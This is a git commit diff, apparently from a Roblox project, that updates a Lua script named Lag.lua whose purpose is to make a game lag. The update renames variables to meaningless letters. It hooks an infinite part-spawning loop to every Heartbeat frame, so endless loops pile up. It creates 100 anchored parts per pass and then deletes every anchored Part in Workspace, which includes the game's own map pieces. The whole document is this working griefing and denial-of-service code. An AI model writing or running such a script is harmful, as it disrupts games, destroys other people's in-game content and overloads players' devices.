9af7bca11c899db8102efe55c9beebd835380a69
IceyyDevv <salkicalteldin@gmail.com>
2026-02-22 00:25:58 -0600

    Update Lag.lua

--- Lag.lua
+++ Lag.lua
@@ -1,17 +1,24 @@
-local runService = game:GetService("RunService")
+local a = game:GetService("RunService")
+local b = game:GetService("Workspace")
 
-local function createLag()
+local function c()
 	while true do
-		local part = Instance.new("Part")
-		part.Size = Vector3.new(1, 1, 1)
-		part.Position = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
-		part.Anchored = true
-		part.Parent = workspace
+		for i = 1, 100 do
+			local d = Instance.new("Part")
+			d.Size = Vector3.new(1, 1, 1)
+			d.Position = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
+			d.Anchored = true
+			d.Parent = b
+		end
 
-		task.wait(0.01)
+		task.wait(0.1)
 
-		part:Destroy()
+		for _, d in pairs(b:GetChildren()) do
+			if d:IsA("Part") and d.Anchored then
+				d:Destroy()
+			end
+		end
 	end
 end
 
-runService.RenderStepped:Connect(createLag)
+a.Heartbeat:Connect(c)
